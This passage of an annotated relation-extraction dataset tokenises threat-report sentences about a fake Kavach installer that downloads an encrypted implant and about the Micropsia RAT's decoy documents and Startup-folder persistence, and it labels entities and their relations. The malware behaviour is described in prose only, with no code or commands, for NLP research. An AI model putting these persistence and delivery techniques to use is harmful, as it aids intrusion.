"SO", "sent_id": 3, "global_pos": [97, 97], "name": "website", "pos": [23, 24], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "downloader", "pos": [1, 2], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [113, 113], "name": "payload", "pos": [11, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [117, 117], "name": "Kavach installer", "pos": [15, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [133, 133], "name": "downloader binary", "pos": [13, 15], "index": "12_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [147, 147], "name": "MSI", "pos": [27, 28], "index": "13_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [156, 156], "name": "MSI", "pos": [3, 4], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [163, 163], "name": "downloader 's resources", "pos": [10, 13], "index": "15_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [193, 193], "name": "remote location", "pos": [9, 11], "index": "16_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [1, 2], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "t": 3, "h": 4}, {"r": "RF", "evidence": [2], "h": 4, "t": 5}, {"r": "WR", "evidence": [3], "h": 6, "t": 7}, {"r": "EX", "evidence": [3], "h": 6, "t": 7}, {"r": "RF", "evidence": [3], "h": 6, "t": 8}, {"r": "FR", "evidence": [3, 4], "h": 6, "t": 9}, {"r": "EX", "evidence": [4], "h": 9, "t": 10}, {"r": "CD", "evidence": [4], "h": 9, "t": 11}, {"r": "EX", "evidence": [4], "h": 9, "t": 11}, {"r": "WR", "evidence": [4, 5], "h": 9, "t": 12}, {"r": "ST", "evidence": [4, 5, 6, 7], "h": 9, "t": 16}, {"r": "RF", "evidence": [4, 5, 6, 7], "h": 9, "t": 16}, {"r": "CO", "evidence": [5, 6], "h": 13, "t": 14}]}, {"title": "09_g02-2", "sents": [["To", "install", "the", "Kavach", "application", ",", "a", "splash", "screen", "is", "displayed", "to", "the", "victim", "."], ["A", "malicious", "payload", "is", "downloaded", "by", "the", "downloader", "from", "an", "attacker-controlled", ",", "fake", "website", "that", "mimics", "a", "legitimate", "Indian", "government", "or", "pseudo-government", "entity", ",", "and", "then", "executed", "on", "the", "infected", "endpoint", "."], ["To", "lend", "credibility", "to", "the", "entire", "attack", "chain", ",", "the", "downloader", "downloads", "a", "legitimate", "MSI", "installer", "for", "the", "Kavach", "app", "from", "another", "attacker-managed", "website", "and", "launches", "it", "."], ["The", "downloader", "is", "responsible", "for", "obtaining", "and", "executing", "both", "the", "malicious", "payload", "and", "the", "legitimate", "Kavach", "installer", "."], ["Another", "method", "of", "initial", "infection", "vector", "is", "the", "usage", "of", "a", "significantly", "larger", "downloader", "binary", "(", "141MB", ")", ",", "which", "contains", "an", "authentic", "Kavach", "application", "installer", "(", "MSI", ")", "as", "a", "resource", "."], ["The", "installer", "(", "MSI", ")", "is", "taken", "out", "of", "the", "downloader", "'s", "resources", "in", "a", "compressed", "format", "and", "then", "executed", "on", "the", "infected", "system", "as", "a", "facade", "to", "appear", "legitimate", "."], ["The", "actual", "attack", "implant", "is", "then", "downloaded", "from", "a", "remote", "location", ",", "decrypted", "using", "AES", "and", "a", "hardcoded", "key", ",", "stored", "on", "the", "disk", "and", "then", "executed", "on", "the", "compromised", "endpoint", "."], ["A", "remote", "location", "is", "used", "by", "the", "second", "downloader", "variant", "to", "download", "and", "decode", "the", "payload", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "Kavach", "pos": [3, 4], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [17, 17], "name": "payload", "pos": [2, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [19, 19], "name": "downloaded", "pos": [4, 5], "index": "2_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [28, 28], "name": "website", "pos": [13, 14], "index": "3_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [57, 57], "name": "downloader", "pos": [10, 11], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "Kavach", "pos": [18, 19], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [70, 70], "name": "website", "pos": [23, 24], "index": "6_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "downloader", "pos": [1, 2], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [86, 86], "name": "payload", "pos": [11, 12], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [90, 90], "name": "Kavach installer", "pos": [15, 17], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [106, 106], "name": "downloader binary", "pos": [13, 15], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [120, 120], "name": "MSI", "pos": [27, 28], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [129, 129], "name": "MSI", "pos": [3, 4], "index": "12_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [136, 136], "name": "downloader 's resources", "pos": [10, 13], "index": "13_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [166, 166], "name": "remote location", "pos": [9, 11], "index": "14_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [190, 190], "name": "remote location", "pos": [1, 3], "index": "15_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [197, 197], "name": "downloader", "pos": [8, 9], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [204, 204], "name": "payload", "pos": [15, 16], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "WR", "evidence": [1], "t": 1, "h": 2}, {"r": "RF", "evidence": [1], "h": 2, "t": 3}, {"r": "WR", "evidence": [2], "h": 4, "t": 5}, {"r": "EX", "evidence": [2], "h": 4, "t": 5}, {"r": "RF", "evidence": [2], "h": 4, "t": 6}, {"r": "FR", "evidence": [2, 3], "h": 4, "t": 7}, {"r": "EX", "evidence": [3], "h": 7, "t": 8}, {"r": "CD", "evidence": [3], "h": 7, "t": 9}, {"r": "EX", "evidence": [3], "h": 7, "t": 9}, {"r": "WR", "evidence": [3, 4], "h": 7, "t": 10}, {"r": "ST", "evidence": [3, 4, 5, 6], "h": 7, "t": 14}, {"r": "RF", "evidence": [3, 4, 5, 6], "h": 7, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 11, "t": 12}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "WR", "evidence": [4, 5, 6, 7], "t": 10, "h": 16}, {"r": "WR", "evidence": [5, 6, 7], "t": 12, "h": 16}, {"r": "EX", "evidence": [5, 6, 7], "t": 13, "h": 16}, {"r": "RF", "evidence": [7], "t": 15, "h": 16}, {"r": "WR", "evidence": [7], "h": 16, "t": 17}]}, {"title": "628-0", "sents": [["The", "actor", "uses", "the", "Micropsia", "implant", "in", "the", "most", "recent", "wave", "that", "started", "around", "October", "2021", "."], ["It", "is", "highly", "likely", "that", "the", "threat", "actor", "has", "continued", "to", "use", "the", "email", "vector", "to", "deliver", "their", "lures", "and", "implants", "."], ["Form1", "contentsAll", "the", "malicious", "functionalities", "are", "implemented", "through", "the", "timers", "configured", "in", "the", "implant", "."], ["Deploying", "the", "decoy", "documentOne", "of", "these", "timers", "is", "responsible", "for", "extracting", "the", "decoy", "document", "and", "saving", "it", "to", "the", "%", "TEMP", "%", "folder", "and", "then", "displaying", "it", "via", "ShellExecute", ":", "Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Establishing", "persistenceAnother", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "actor", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [4, 4], "name": "Micropsia implant", "pos": [4, 6], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "actor", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "email vector", "pos": [13, 15], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [35, 35], "name": "lures", "pos": [18, 19], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [37, 37], "name": "implants", "pos": [20, 21], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [43, 43], "name": "functionalities", "pos": [4, 5], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [48, 48], "name": "timers", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "implant", "pos": [13, 14], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [60, 60], "name": "timers", "pos": [6, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [66, 66], "name": "decoy document", "pos": [12, 14], "index": "10_0"}], [{"type": "SF", "sent_id": 3, "global_pos": [73, 73], "name": "% TEMP % folder", "pos": [19, 23], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [82, 82], "name": "ShellExecute", "pos": [28, 29], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [97, 97], "name": "implant", "pos": [4, 5], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [103, 103], "name": "-start", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [118, 118], "name": "decoy document", "pos": [25, 27], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [130, 130], "name": "timer", "pos": [2, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [138, 138], "name": "implant", "pos": [10, 11], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [141, 141], "name": "endpoint", "pos": [13, 14], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [146, 146], "name": "implant", "pos": [3, 4], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [154, 154], "name": "command line", "pos": [11, 13], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [164, 164], "name": "shortcut", "pos": [21, 22], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [169, 169], "name": "% TEMP % directory", "pos": [26, 30], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [175, 175], "name": "shortcut", "pos": [1, 2], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [179, 179], "name": "implant", "pos": [5, 6], "index": "24_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "WR", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 2}, {"r": "RD", "evidence": [1], "h": 2, "t": 4}, {"r": "WR", "evidence": [1], "h": 2, "t": 5}, {"r": "RD", "evidence": [1, 2], "t": 5, "h": 7}, {"r": "WR", "evidence": [2], "t": 6, "h": 7}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "FR", "evidence": [3], "h": 9, "t": 12}, {"r": "RD", "evidence": [3], "t": 11, "h": 12}, {"r": "EX", "evidence": [3], "t": 10, "h": 12}, {"r": "WR", "evidence": [3], "t": 11, "h": 12}, {"r": "FR", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "ST", "evidence": [5], "h": 16, "t": 18}, {"r": "FR", "evidence": [6], "h": 19, "t": 20}, {"r": "FR", "evidence": [6], "h": 20, "t": 21}, {"r": "WR", "evidence": [6], "h": 20, "t": 22}, {"r": "CO", "evidence": [6, 7], "h": 21, "t": 23}, {"r": "EX", "evidence": [7], "h": 23, "t": 24}]}, {"title": "628-1", "sents": [["It", "is", "highly", "likely", "that", "the", "threat", "actor", "has", "continued", "to", "use", "the", "email", "vector", "to", "deliver", "their", "lures", "and", "implants", "."], ["Form1", "contentsAll", "the", "malicious", "functionalities", "are", "implemented", "through", "the", "timers", "configured", "in", "the", "implant", "."], ["Deploying", "the", "decoy", "documentOne", "of", "these", "timers", "is", "responsible", "for", "extracting", "the", "decoy", "document", "and", "saving", "it", "to", "the", "%", "TEMP", "%", "folder", "and", "then", "displaying", "it", "via", "ShellExecute", ":", "Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Establishing", "persistenceAnother", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "actor", "pos": [7, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [13, 13], "name": "email vector", "pos": [13, 15], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [18, 18], "name": "lures", "pos": [18, 19], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "implants", "pos": [20, 21], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "functionalities", "pos": [4, 5], "index": "4_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [31, 31], "name": "timers", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [35, 35], "name": "implant", "pos": [13, 14], "index": "6_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [43, 43], "name": "timers", "pos": [6, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [49, 49], "name": "decoy document", "pos": [12, 14], "index": "8_0"}], [{"type": "SF", "sent_id": 2, "global_pos": [56, 56], "name": "% TEMP % folder", "pos": [19, 23], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [65, 65], "name": "ShellExecute", "pos": [28, 29], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [80, 80], "name": "implant", "pos": [4, 5], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [86, 86], "name": "-start", "pos": [10, 11], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [101, 101], "name": "decoy document", "pos": [25, 27], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [113, 113], "name": "timer", "pos": [2, 3], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [121, 121], "name": "implant", "pos": [10, 11], "index": "15_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [124, 124], "name": "endpoint", "pos": [13, 14], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [129, 129], "name": "implant", "pos": [3, 4], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [137, 137], "name": "command line", "pos": [11, 13], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [147, 147], "name": "shortcut", "pos": [21, 22], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [152, 152], "name": "% TEMP % directory", "pos": [26, 30], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [158, 158], "name": "shortcut", "pos": [1, 2], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [162, 162], "name": "implant", "pos": [5, 6], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [182, 182], "name": "shortcut", "pos": [1, 2], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [193, 193], "name": "Startup folder", "pos": [12, 14], "index": "24_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0, 1], "t": 3, "h": 5}, {"r": "WR", "evidence": [1], "t": 4, "h": 5}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "FR", "evidence": [1, 2], "h": 6, "t": 7}, {"r": "RD", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [2], "h": 7, "t": 10}, {"r": "RD", "evidence": [2], "t": 9, "h": 10}, {"r": "EX", "evidence": [2], "t": 8, "h": 10}, {"r": "WR", "evidence": [2], "t": 9, "h": 10}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 12, "t": 13}, {"r": "WR", "evidence": [4], "h": 14, "t": 15}, {"r": "ST", "evidence": [4], "h": 14, "t": 16}, {"r": "FR", "evidence": [5], "h": 17, "t": 18}, {"r": "FR", "evidence": [5], "h": 18, "t": 19}, {"r": "WR", "evidence": [5], "h": 18, "t": 20}, {"r": "CO", "evidence": [5, 6], "h": 19, "t": 21}, {"r": "EX", "evidence": [6], "h": 21, "t": 22}, {"r": "FR", "evidence": [6, 7], "h": 21, "t": 23}, {"r": "WR", "evidence": [7], "h": 23, "t": 24}]}, {"title": "628-2", "sents": [["Form1", "contentsAll", "the", "malicious", "functionalities", "are", "implemented", "through", "the", "timers", "configured", "in", "the", "implant", "."], ["Deploying", "the", "decoy", "documentOne", "of", "these", "timers", "is", "responsible", "for", "extracting", "the", "decoy", "document", "and", "saving", "it", "to", "the", "%", "TEMP", "%", "folder", "and", "then", "displaying", "it", "via", "ShellExecute", ":", "Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Establishing", "persistenceAnother", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["Information", "GatheringThe", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "functionalities", "pos": [4, 5], "index": "0_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [9, 9], "name": "timers", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "implant", "pos": [13, 14], "index": "2_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [21, 21], "name": "timers", "pos": [6, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [27, 27], "name": "decoy document", "pos": [12, 14], "index": "4_0"}], [{"type": "SF", "sent_id": 1, "global_pos": [34, 34], "name": "% TEMP % folder", "pos": [19, 23], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "ShellExecute", "pos": [28, 29], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [58, 58], "name": "implant", "pos": [4, 5], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "-start", "pos": [10, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "decoy document", "pos": [25, 27], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [91, 91], "name": "timer", "pos": [2, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "implant", "pos": [10, 11], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [102, 102], "name": "endpoint", "pos": [13, 14], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [107, 107], "name": "implant", "pos": [3, 4], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [115, 115], "name": "command line", "pos": [11, 13], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [125, 125], "name": "shortcut", "pos": [21, 22], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "% TEMP % directory", "pos": [26, 30], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [136, 136], "name": "shortcut", "pos": [1, 2], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [140, 140], "name": "implant", "pos": [5, 6], "index": "18_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [160, 160], "name": "shortcut", "pos": [1, 2], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [171, 171], "name": "Startup folder", "pos": [12, 14], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [185, 185], "name": "timers", "pos": [4, 5], "index": "21_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [190, 190], "name": "information", "pos": [9, 10], "index": "22_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [194, 194], "name": "RAT capabilities", "pos": [13, 15], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0, 1], "h": 2, "t": 3}, {"r": "RD", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [1], "h": 3, "t": 6}, {"r": "RD", "evidence": [1], "t": 5, "h": 6}, {"r": "EX", "evidence": [1], "t": 4, "h": 6}, {"r": "WR", "evidence": [1], "t": 5, "h": 6}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "WR", "evidence": [2], "h": 8, "t": 9}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "FR", "evidence": [4], "h": 13, "t": 14}, {"r": "FR", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 14, "t": 16}, {"r": "CO", "evidence": [4, 5], "h": 15, "t": 17}, {"r": "EX", "evidence": [5], "h": 17, "t": 18}, {"r": "FR", "evidence": [5, 6], "h": 17, "t": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "RD", "evidence": [7], "h": 21, "t": 22}, {"r": "FR", "evidence": [7], "h": 21, "t": 23}]}, {"title": "628-3", "sents": [["Deploying", "the", "decoy", "documentOne", "of", "these", "timers", "is", "responsible", "for", "extracting", "the", "decoy", "document", "and", "saving", "it", "to", "the", "%", "TEMP", "%", "folder", "and", "then", "displaying", "it", "via", "ShellExecute", ":", "Decoy", "document", "extracted", "and", "displayed", "to", "the", "target", "."], ["Now", ",", "if", "the", "implant", "is", "started", "with", "the", "``", "-start", "''", "command-line", "switch", ",", "it", "will", "skip", "the", "process", "for", "dropping", "and", "displaying", "the", "decoy", "document", "and", "jump", "straight", "to", "its", "RAT", "functionalities", "."], ["Establishing", "persistenceAnother", "timer", "is", "used", "to", "establish", "persistence", "for", "the", "implant", "on", "the", "endpoint", "."], ["Here", ",", "the", "implant", "will", "establish", "persistence", "by", "obtaining", "its", "current", "command", "line", ",", "which", "is", "then", "used", "to", "create", "a", "shortcut", "for", "itself", "in", "the", "%", "TEMP", "%", "directory", "."], ["The", "shortcut", "to", "run", "the", "implant", "contains", "the", "``", "-start", "''", "switch", "(", "used", "to", "skip", "the", "displaying", "of", "the", "decoy", "document", ")", "."], ["This", "shortcut", "is", "then", "moved", "over", "to", "the", "currently", "logged-in", "user", "'s", "Startup", "folder", "to", "complete", "persistence", "across", "reboots", "and", "re-logins", "."], ["Information", "GatheringThe", "remaining", "two", "timers", "will", "gather", "preliminary", "system", "information", "and", "activate", "the", "RAT", "capabilities", "of", "the", "implant", "."], ["The", "sequence", "of", "actions", "followed", "for", "gathering", "system", "information", "from", "the", "endpoint", "are", "as", "follows", ":", "Generate", "a", "pc", "ID", "for", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [6, 6], "name": "timers", "pos": [6, 7], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [12, 12], "name": "decoy document", "pos": [12, 14], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [19, 19], "name": "% TEMP % folder", "pos": [19, 23], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [28, 28], "name": "ShellExecute", "pos": [28, 29], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [43, 43], "name": "implant", "pos": [4, 5], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [49, 49], "name": "-start", "pos": [10, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [64, 64], "name": "decoy document", "pos": [25, 27], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [76, 76], "name": "timer", "pos": [2, 3], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "implant", "pos": [10, 11], "index": "8_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [87, 87], "name": "endpoint", "pos": [13, 14], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [92, 92], "name": "implant", "pos": [3, 4], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [100, 100], "name": "command line", "pos": [11, 13], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [110, 110], "name": "shortcut", "pos": [21, 22], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [115, 115], "name": "% TEMP % directory", "pos": [26, 30], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [121, 121], "name": "shortcut", "pos": [1, 2], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [125, 125], "name": "implant", "pos": [5, 6], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [145, 145], "name": "shortcut", "pos": [1, 2], "index": "16_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [156, 156], "name": "Startup folder", "pos": [12, 14], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [170, 170], "name": "timers", "pos": [4, 5], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [175, 175], "name": "information", "pos": [9, 10], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [179, 179], "name": "RAT capabilities", "pos": [13, 15], "index": "20_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [188, 188], "name": "actions", "pos": [3, 4], "index": "21_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [192, 192], "name": "system information", "pos": [7, 9], "index": "22_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [196, 196], "name": "endpoint", "pos": [11, 12], "index": "23_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [203, 203], "name": "pc ID", "pos": [18, 20], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [208, 208], "name": "endpoint", "pos": [23, 24], "index": "25_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "RD", "evidence": [0], "t": 2, "h": 3}, {"r": "EX", "evidence": [0], "t": 1, "h": 3}, {"r": "WR", "evidence": [0], "t": 2, "h": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "ST", "evidence": [2], "h": 7, "t": 9}, {"r": "FR", "evidence": [3], "h": 10, "t": 11}, {"r": "FR", "evidence": [3], "h": 11, "t": 12}, {"r": "WR", "evidence": [3], "h": 11, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 14}, {"r": "EX", "evidence": [4], "h": 14, "t": 15}, {"r": "FR", "evidence": [4, 5], "h": 14, "t": 16}, {"r": "WR", "evidence": [5], "h": 16, "t": 17}, {"r": "RD", "evidence": [6], "h": 18, "t": 19}, {"r": 